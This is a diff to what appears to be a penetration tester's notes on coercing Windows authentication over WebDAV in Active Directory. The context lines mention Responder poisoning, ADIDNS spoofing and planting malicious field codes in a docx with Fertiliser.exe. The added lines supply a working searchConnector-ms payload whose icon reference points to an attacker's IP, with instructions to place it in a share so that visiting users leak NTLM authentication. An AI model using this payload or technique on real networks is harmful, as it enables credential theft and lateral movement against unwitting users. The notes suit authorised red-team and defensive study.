@@ -132,6 +132,12 @@ WebDAV is a file server over HTTP. The service WebClient is present on workstati
   - Either poisoned in the local subnet using Responder
   - Create a DNS A record pointing to an external IP (Check ADIDNS --> https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing or https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)
 
+## Search Connector file
+```
+<?xml version="1.0" encoding="UTF-8"?> <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector"> <iconReference>imageres.dll,-1002</iconReference> <description>Microsoft Outlook</description> <isSearchOnlyItem>false</isSearchOnlyItem> <includeInStartMenuScope>true</includeInStartMenuScope> <iconReference>https://192.168.101.11/0001.ico</iconReference> <templateInfo> <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType> </templateInfo> <simpleLocation> <url>https://www.example.com/</url> </simpleLocation> </searchConnectorDescription>
+```
+Place with filename: Documents.searchConnector-ms   
+
 ### Exploitation
 **Example Using Fertiliser.exe:**   
 Using the tool Fertiliser.exe (GitHub.com/mdsecactivebreach/Farmer) a docx file was updated to contain a malicious field code pointing to the WebDAV server running on Kali (Responder.py instance):   
